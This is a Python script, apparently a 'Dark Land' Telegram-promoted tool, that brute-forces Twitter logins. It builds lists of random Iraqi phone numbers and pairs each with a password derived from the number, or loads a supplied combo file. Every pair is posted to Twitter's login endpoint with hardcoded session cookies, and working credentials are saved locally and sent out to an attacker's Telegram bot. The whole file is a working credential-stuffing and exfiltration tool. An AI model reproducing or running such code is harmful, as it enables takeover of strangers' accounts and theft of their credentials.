import os,sys

import user_agent
if os.name=="nt":
	os.system("start https://t.me/dark_land12")
	clear="cls"
	pass
else:
	os.system("xdg-open https://t.me/dark_land12")
	clear="clear"
	pass
try:
	import requests,random,time,os
	from user_agent import generate_user_agent as ug
except ModuleNotFoundError:
	os.system("pip install requests")
	os.system("pip install user_agent")
try:os.remove("combooo1.txt")
except:pass
os.system(clear)
loqohhh='''

      :::::::::      :::     :::::::::  :::    :::          :::            :::     ::::    ::: ::::::::: 
     :+:    :+:   :+: :+:   :+:    :+: :+:   :+:           :+:          :+: :+:   :+:+:   :+: :+:    :+: 
    +:+    +:+  +:+   +:+  +:+    +:+ +:+  +:+            +:+         +:+   +:+  :+:+:+  +:+ +:+    +:+  
   +#+    +:+ +#++:++#++: +#++:++#:  +#++:++             +#+        +#++:++#++: +#+ +:+ +#+ +#+    +:+   
  +#+    +#+ +#+     +#+ +#+    +#+ +#+  +#+            +#+        +#+     +#+ +#+  +#+#+# +#+    +#+    
 #+#    #+# #+#     #+# #+#    #+# #+#   #+#           #+#        #+#     #+# #+#   #+#+# #+#    #+#     
#########  ###     ### ###    ### ###    ###          ########## ###     ### ###    #### #########       

ᵈᵃʳᵏ
ˡᵃⁿᵈ
'''
print(loqohhh)
print()
ID=input('  ID Telegram akat Dane : ')
print()
token=input('  Token Bot Dane : ')
print()
good=0
bad=0
kill=0
tested=0
total=0
lul=input("  Xot Combo Daxl dakay ( 1- Naxer , 2- Bale) : ")
print()
if lul=="2":
	S=input('  Path Combo Kat Dane : ')
	print()
	print("  wait ..... \n")
	fileaka=open(S,'r').read().splitlines()
	for lulpech in fileaka:
		total+=1
	pass
else:
	print("  1- 0770\n  2- 0771 \n  3- 0772 \n  4- 0773 \n  5- 0774 \n  6- 0750 \n  7- 0751 \n  8- 0752 \n  9- 0753 \n  10- 0754 \n  11- 0780\n  12- ( 0771, 0772 , 0751 , 0752 )\n  13- ( 0770 , 0750 , 0780 )")
	maza=input("\n Sarata kay chi bet : ")
	print()
	print("wait .....")
	if maza=="1":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964770{lol}:0770{lol}\n")
	elif maza=="2":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964771{lol}:0771{lol}\n")
	elif maza=="3":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964+964772{lol}:0772{lol}\n")
	elif maza=="4":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964773{lol}:0773{lol}\n")
	elif maza=="5":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964774{lol}:0774{lol}\n")
	elif maza=="6":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964750{lol}:0750{lol}\n")
	elif maza=="7":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964751{lol}:0751{lol}\n")
	elif maza=="8":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964752{lol}:0752{lol}\n")
	elif maza=="9":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964753{lol}:0753{lol}\n")
	elif maza=="10":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964754{lol}:0754{lol}\n")
	elif maza=="11":
		for swr in range(5000):
			lol=random.randint(1000000, 9999999)
			with open("combooo1.txt", "a") as lp:
				lp.write(f"+964780{lol}:0780{lol}\n")
	elif maza=="12":
		for swr in range(2500):
			sf=random.randint(1000000, 9999999)
			sff=random.randint(1000000, 9999999)
			sfff=random.randint(1000000, 9999999)
			sffff=random.randint(1000000, 9999999)
			with open('combooo1.txt', "a") as wsba:
				wsba.write(f"+964771{sf}:0771{sf}\n")
			with open('combooo1.txt', "a") as wsba:
				wsba.write(f"+964751{sff}:0751{sff}\n")
			with open('combooo1.txt', "a") as wsba:
				wsba.write(f"+964752{sfff}:0752{sfff}\n")
			with open('combooo1.txt', "a") as wsba:
				wsba.write(f"+964772{sfff}:0772{sfff}\n")
	else:
		for swr in range(3500):
			sf=random.randint(1000000, 9999999)
			sff=random.randint(1000000, 9999999)
			sfff=random.randint(1000000, 9999999)
			with open('combooo1.txt', "a") as wsba:
				wsba.write(f"+964770{sf}:0770{sf}\n")
			with open('combooo1.txt', "a") as wsba:
				wsba.write(f"+964750{sff}:0750{sff}\n")
			with open('combooo1.txt', "a") as wsba:
				wsba.write(f"+964780{sfff}:0780{sfff}\n")
	S="combooo1.txt"
	ss=open(S,'r').read().splitlines()
	for darkland in ss:
		total+=1
for x in open(S,'r').read().splitlines():
	user=x.split(":")[0]
	pess=x.split(":")[1]
	headd={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Content-Length': '901','Content-Type': 'application/x-www-form-urlencoded','Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397','Host': 'twitter.com','Origin': 'https://twitter.com','Referer': 'https://twitter.com/login?lang=ar','TE': 'Trailers','Upgrade-Insecure-Requests': '1'}
	data={'redirect_after_login': '/','remember_me': '1','authenticity_token': '10908ac0975311eb868c135992f7d397','wfa': '1','ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}','session[username_or_email]': user,'session[password]': pess}
	try:
		time.sleep(3.8)
		req=requests.post(f'https://twitter.com/sessions',headers=headd,data=data)
		if ("ct0") in req.cookies:
			os.system(clear)
			print(loqohhh)
			good+=1
			tested+=1
			print(f" Total : {total} | Tested : {tested} | Good : {good} | Bad : {bad} ")
			#
			try:
				YES=f"""  Twitter Cracked  \n GOOD: +{user}:{pess}"""
				requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\n join @darl_land12 ')
			except:
				pass
			with open('GOOD.txt', 'a') as x:
				x.write(f'{user}:{pess}'+'\n')
		else:
			tested+=1
			bad+=1
			os.system(clear)
			print(loqohhh)
			print(f" Total : {total} | Tested : {tested} | Good : {good} | Bad : {bad} ")
	except requests.exceptions.ConnectionError:
		print()
	except KeyboardInterrupt:
		exit(0)
